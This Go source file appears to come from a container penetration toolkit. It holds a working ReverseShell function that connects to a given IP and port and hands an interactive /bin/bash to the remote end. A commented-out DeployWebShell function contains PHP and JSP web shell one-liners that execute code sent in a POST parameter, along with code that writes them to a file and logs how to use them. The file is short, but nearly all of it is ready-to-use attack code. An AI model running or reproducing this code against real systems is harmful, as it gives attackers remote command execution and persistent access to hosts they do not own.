package gadget

import (
	"net"
	"os/exec"
)

// ReverseShell start a reverse shell on ip:port
func ReverseShell(ip string, port string) error {
	conn, err := net.Dial("tcp", ip+":"+port)
	if err != nil {
		return err
	}
	cmd := exec.Command("/bin/bash")
	cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
	if err := cmd.Run(); err != nil {
		return err
	}
	return nil
}

// func DeployWebShell(scriptType string, path string) {
// 	var webShellCodeJSP = "<%Runtime.getRuntime().exec(request.getParameter(\"$SECRET_PARAM\"));%>"
// 	var webShellCodePHP = "<?php @eval($_POST['$SECRET_PARAM']);?>"

// 	var content string
// 	var param = "cpt_" + utils.RandString(7)
// 	switch strings.ToLower(scriptType) {
// 	case "jsp":
// 		content = strings.ReplaceAll(webShellCodeJSP, "$SECRET_PARAM", param)
// 	case "php":
// 		content = strings.ReplaceAll(webShellCodePHP, "$SECRET_PARAM", param)
// 	default:
// 		log.Error("invalid input args. Usage: cdk run deploy-webshell (php|jsp) <filepath>.")
// 		return
// 	}
// 	err := utils.WriteFile(path, content)
// 	if err != nil {
// 		log.Error("write web shell content failed.\"")
// 		return
// 	}
// 	logData := fmt.Sprintf("\t%s webshell saved in %s\n\tsend codes or system command via post param: %s=(codes)\n", scriptType, path, param)
// 	log.Println(logData)
// }
